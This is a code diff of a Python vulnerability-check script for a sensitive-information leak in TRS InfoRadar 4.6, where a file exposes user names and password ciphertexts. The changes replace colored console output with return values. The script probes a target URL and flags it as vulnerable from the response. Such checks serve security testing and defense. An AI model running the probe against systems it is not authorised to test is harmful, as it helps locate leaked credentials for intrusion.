@@ -8,8 +8,8 @@ description: 敏感文件init_sysUsers.xml中泄露了用户名和密码密文,�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class trs_inforadar_disclosure_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class trs_inforadar_disclosure_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"java.beans.XMLDecoder" in req.text and r"property" in req.text:
-                cprint("[+]存在TRS网络信息雷达4.6系统敏感信息泄漏漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在TRS网络信息雷达4.6系统敏感信息泄漏漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = trs_inforadar_disclosure_BaseVerify(sys.argv[1])
     testVuln.run()
